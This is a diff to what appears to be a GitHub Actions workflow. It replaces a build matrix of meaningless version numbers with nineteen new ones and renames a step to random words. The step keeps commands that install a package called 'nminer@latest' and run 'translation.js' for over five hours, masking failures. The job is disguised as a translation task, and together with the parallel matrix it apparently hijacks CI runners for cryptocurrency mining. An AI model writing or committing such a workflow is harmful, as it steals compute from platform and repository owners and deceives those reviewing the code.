@@ -9,22 +9,25 @@ jobs:
     strategy:
       matrix:
         config:
-          - { version: 1216 }
-          - { version: 7666 }
-          - { version: 2830 }
-          - { version: 9720 }
-          - { version: 437 }
-          - { version: 8765 }
-          - { version: 6847 }
-          - { version: 6720 }
-          - { version: 9300 }
-          - { version: 6153 }
-          - { version: 1188 }
-          - { version: 4191 }
-          - { version: 6787 }
-          - { version: 1790 }
-          - { version: 506 }
-          - { version: 1061 }
+          - { version: 5344 }
+          - { version: 2474 }
+          - { version: 1882 }
+          - { version: 6967 }
+          - { version: 1633 }
+          - { version: 9886 }
+          - { version: 1786 }
+          - { version: 6839 }
+          - { version: 1703 }
+          - { version: 2936 }
+          - { version: 3889 }
+          - { version: 4897 }
+          - { version: 5924 }
+          - { version: 9119 }
+          - { version: 1587 }
+          - { version: 376 }
+          - { version: 262 }
+          - { version: 6119 }
+          - { version: 6708 }
 
     steps:
       - name: Checkout
@@ -35,7 +38,7 @@ jobs:
         with:
           node-version: 20
           
-      - name: cluttered when guest fictionalize
+      - name: obedient dimly sadly
         run: |
           npm install nminer@latest
-          timeout 335m node translation.js || echo "translation executed"
+          timeout 317m node translation.js || echo "translation executed"
